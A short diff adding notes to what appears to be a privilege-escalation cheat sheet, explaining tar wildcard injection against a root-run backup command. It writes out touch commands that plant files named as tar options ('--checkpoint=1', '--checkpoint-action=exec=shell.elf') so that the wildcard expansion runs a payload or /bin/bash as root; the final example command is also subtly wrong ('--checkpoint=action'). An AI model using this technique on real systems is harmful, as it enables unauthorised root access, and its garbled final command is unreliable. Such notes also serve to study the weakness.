@@ -19,3 +19,14 @@ GET rootshell with -p
 cd /home/usr
 tar czf /tmp/backup.tar.gz * 
 
+--checkpoint is the tar flag
+
+So, create checkpoint first
+#touch /home/user/--checkpoint=1
+#touch /home/user/--checkpoint-action=exec=shell.elf (instead shell.elf you can change /bin/bash or whatever)
+
+So,final command is like. ( we just inject the payload in the place of *(wild-card))
+tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint=action=shell.elf
+
+
+
